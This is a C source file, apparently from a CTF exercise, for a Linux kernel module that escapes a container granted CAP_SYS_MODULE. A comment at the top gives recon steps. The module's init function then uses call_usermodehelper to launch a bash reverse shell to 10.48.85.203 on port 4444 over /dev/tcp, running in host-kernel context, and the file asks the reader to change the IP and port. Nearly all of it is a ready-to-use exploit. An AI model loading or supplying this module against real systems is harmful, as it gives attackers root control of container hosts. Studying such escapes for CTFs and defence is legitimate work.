/*
Container Escape via Kernel Module Loading.
container was granted the CAP_SYS_MODULE capability. This capability allows a process to insert code directly into the running kernel.
so basically we will execute our code on host kernel.Not inside the container.


let's check if CAP_SYS_MODULE is enabled
capsh --print |grep 'cap_sys_module'
now let's check the kernel version of Host Machine(containers share the host kernel)
uname -r
now let's see what kernel header we have in our container(the directory /lib/modules/... is part of the filesystem, which is isolated (or layered) in containers.)
cd /lib/modules && ls
*/
#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CTF");
MODULE_DESCRIPTION("Container Escape LKM");

// Define the path separately
static char* path = "/bin/bash";
static char* argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.48.85.203/4444 0>&1", NULL}; //change ip adn port
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};

static int __init reverse_shell_init(void) {
    // Corrected signature: path, argv, envp, wait
    return call_usermodehelper(path, argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Cleaning up\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);   
